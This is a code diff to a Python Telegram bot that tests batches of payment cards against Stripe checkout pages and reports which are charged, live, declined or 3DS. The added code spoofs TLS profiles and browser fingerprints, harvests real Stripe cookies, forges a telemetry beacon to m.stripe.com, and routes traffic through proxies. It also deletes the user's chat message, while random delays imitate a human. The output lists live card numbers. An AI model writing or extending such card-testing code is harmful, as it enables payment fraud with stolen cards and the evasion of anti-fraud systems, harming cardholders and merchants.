@@ -23,7 +23,7 @@ from utils.proxy import (
     get_user_proxy, get_proxy_info, check_proxies_batch,
 )
 from utils.ratelimit import check_rate_limit, get_cooldown_seconds, MAX_CARDS_PER_COMMAND
-from utils.stripe import generate_session_context
+from utils.stripe import generate_session_context, warm_checkout_session, send_m_stripe_beacon
 
 router = Router()
 
@@ -467,7 +467,81 @@ async def co_handler(msg: Message):
         parse_mode=ParseMode.HTML
     )
 
-    checkout_data = await get_checkout_info(url)
+    # Auto-delete user's message to keep chat clean
+    try:
+        await msg.delete()
+    except Exception:
+        pass  # No delete permission in this chat
+
+    # Create session context FIRST — same TLS/fingerprints for init AND confirm
+    session_ctx = generate_session_context(user_id)
+    init_proxy = get_user_proxy(user_id)
+    print(f"[DEBUG] Session: TLS={session_ctx['tls_profile']}, guid={session_ctx['fingerprints']['guid'][:8]}...")
+    print(f"[DEBUG] Using SAME proxy for init + confirm: {'YES' if init_proxy else 'DIRECT'}")
+
+    # ━━━ Step 1: Warm checkout session — get REAL Stripe cookies ━━━
+    warm_result = await warm_checkout_session(
+        checkout_url=url,
+        tls_profile=session_ctx['tls_profile'],
+        user_agent=session_ctx['user_agent'],
+        proxy=init_proxy
+    )
+    if warm_result["cookies"]:
+        # Update session context with REAL cookies from Stripe
+        real_cookies = warm_result["cookies"]
+        
+        # ━━━ CRITICAL: Sync muid/sid with real cookies ━━━
+        # Real browser: __stripe_mid cookie === muid in payment body
+        if "__stripe_mid" in real_cookies:
+            session_ctx["fingerprints"]["muid"] = real_cookies["__stripe_mid"]
+        if "__stripe_sid" in real_cookies:
+            session_ctx["fingerprints"]["sid"] = real_cookies["__stripe_sid"]
+        
+        real_cookies_str = "; ".join([f"{k}={v}" for k, v in real_cookies.items()])
+        session_ctx["cookies"] = real_cookies_str
+        session_ctx["real_cookies"] = real_cookies
+        print(f"[DEBUG] ✅ REAL cookies synced: {list(real_cookies.keys())}")
+        print(f"[DEBUG] ✅ muid={session_ctx['fingerprints']['muid'][:12]}... sid={session_ctx['fingerprints']['sid'][:12]}...")
+    else:
+        # No real cookies — build cookies FROM fingerprints so they match
+        fp = session_ctx["fingerprints"]
+        session_ctx["cookies"] = f"__stripe_mid={fp['muid']}; __stripe_sid={fp['sid']}"
+        session_ctx["real_cookies"] = {}
+        print(f"[DEBUG] ⚠️ No real cookies, built from fingerprints (synced)")
+
+    # ━━━ Step 2: Send telemetry beacon to m.stripe.com ━━━
+    beacon_ok, beacon_cookies = await send_m_stripe_beacon(
+        fp=session_ctx['fingerprints'],
+        checkout_url=url,
+        tls_profile=session_ctx['tls_profile'],
+        user_agent=session_ctx['user_agent'],
+        cookies_str=session_ctx["cookies"],
+        proxy=init_proxy
+    )
+    
+    # If beacon returned cookies, merge them and sync fingerprints
+    if beacon_cookies:
+        if "__stripe_mid" in beacon_cookies:
+            session_ctx["fingerprints"]["muid"] = beacon_cookies["__stripe_mid"]
+        if "__stripe_sid" in beacon_cookies:
+            session_ctx["fingerprints"]["sid"] = beacon_cookies["__stripe_sid"]
+        # Rebuild cookies string with all cookies
+        all_cookies = {}
+        all_cookies[f"__stripe_mid"] = session_ctx["fingerprints"]["muid"]
+        all_cookies[f"__stripe_sid"] = session_ctx["fingerprints"]["sid"]
+        all_cookies.update(beacon_cookies)
+        session_ctx["cookies"] = "; ".join([f"{k}={v}" for k, v in all_cookies.items()])
+        print(f"[DEBUG] ✅ Beacon cookies merged + synced")
+
+    # ━━━ Step 3: Init with real cookies ━━━
+    # Pass TLS profile + proxy to init so it matches confirm
+    checkout_data = await get_checkout_info(
+        url,
+        tls_profile=session_ctx['tls_profile'],
+        user_agent=session_ctx['user_agent'],
+        proxy=init_proxy,
+        cookies_str=session_ctx["cookies"]
+    )
 
     if checkout_data.get("error"):
         await processing_msg.edit_text(
@@ -509,10 +583,6 @@ async def co_handler(msg: Message):
     check_interval = 5
     last_update = time.perf_counter()
 
-    # Create session context ONCE — same browser/fingerprints for all cards
-    session_ctx = generate_session_context(user_id)
-    print(f"[DEBUG] Session: TLS={session_ctx['tls_profile']}, guid={session_ctx['fingerprints']['guid'][:8]}...")
-
     for i, card in enumerate(cards):
         # Random delay between cards (1.5–3.5s) to mimic human behavior
         if i > 0:
@@ -535,18 +605,25 @@ async def co_handler(msg: Message):
             live = sum(1 for r in results if r['status'] == 'LIVE')
             declined = sum(1 for r in results if r['status'] == 'DECLINED')
             three_ds = sum(1 for r in results if r['status'] == '3DS')
+            captcha_solved = sum(1 for r in results if r['status'] == 'SOLVED CAPTCHA')
             errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
+
+            progress_lines = [
+                f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n",
+                f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n",
+                f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n",
+                f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} 😎</code>\n",
+                f"「❃」 𝗟𝗶𝘃𝗲 : <code>{live} ✅</code>\n",
+                f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} 🥲</code>\n",
+                f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 😡</code>\n",
+            ]
+            if captcha_solved > 0:
+                progress_lines.append(f"「❃」 𝗦𝗼𝗹𝘃𝗲𝗱 : <code>{captcha_solved} 🧩</code>\n")
+            progress_lines.append(f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} 💀</code></blockquote>")
 
             try:
                 await processing_msg.edit_text(
-                    f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
-                    f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
-                    f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
-                    f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} 😎</code>\n"
-                    f"「❃」 𝗟𝗶𝘃𝗲 : <code>{live} ✅</code>\n"
-                    f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} 🥲</code>\n"
-                    f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 😡</code>\n"
-                    f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} 💀</code></blockquote>",
+                    "".join(progress_lines),
                     parse_mode=ParseMode.HTML
                 )
             except Exception:
@@ -565,6 +642,7 @@ async def co_handler(msg: Message):
     live_count = sum(1 for r in results if r['status'] == 'LIVE')
     declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
     three_ds_count = sum(1 for r in results if r['status'] == '3DS')
+    captcha_count = sum(1 for r in results if r['status'] == 'SOLVED CAPTCHA')
     error_count = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN'])
     req_name = msg.from_user.full_name or msg.from_user.username or 'Unknown'
     req_user = f"@{msg.from_user.username}" if msg.from_user.username else req_name
@@ -590,6 +668,8 @@ async def co_handler(msg: Message):
         if live_count > 0:
             summary_parts.append(f"✅ {live_count}")
         summary_parts.append(f"🥲 {declined_count}")
+        if captcha_count > 0:
+            summary_parts.append(f"🧩 {captcha_count}")
         if three_ds_count > 0:
             summary_parts.append(f"😡 {three_ds_count}")
         response += "  ".join(summary_parts)
@@ -687,12 +767,27 @@ async def co_handler(msg: Message):
             if len(live_cards) > 5:
                 response += f"       ⋯ {len(live_cards) - 5} more LIVE cards ⋯\n\n"
 
+        # Show 3DS cards with detail type
+        three_ds_cards = [r for r in results if r['status'] == '3DS']
+        if three_ds_cards:
+            for r in three_ds_cards[:3]:
+                response += (
+                    f"💳 𝗖𝗮𝗿𝗱  ➜  <code>{r['card']}</code>\n"
+                    f"📌 𝗦𝘁𝗮𝘁𝘂𝘀  ➜  3DS 😡\n"
+                    f"📝 𝗗𝗲𝘁𝗮𝗶𝗹  ➜  {r['response']}\n"
+                    f"{CARD_SEPARATOR}\n"
+                )
+            if len(three_ds_cards) > 3:
+                response += f"       ⋯ {len(three_ds_cards) - 3} more 3DS cards ⋯\n\n"
+
         # Summary
         response += f"{sep}\n"
         summary_parts = []
         if live_count > 0:
             summary_parts.append(f"✅ {live_count}")
         summary_parts.append(f"🥲 {declined_count}")
+        if captcha_count > 0:
+            summary_parts.append(f"🧩 {captcha_count}")
         if three_ds_count > 0:
             summary_parts.append(f"😡 {three_ds_count}")
         if error_count > 0:
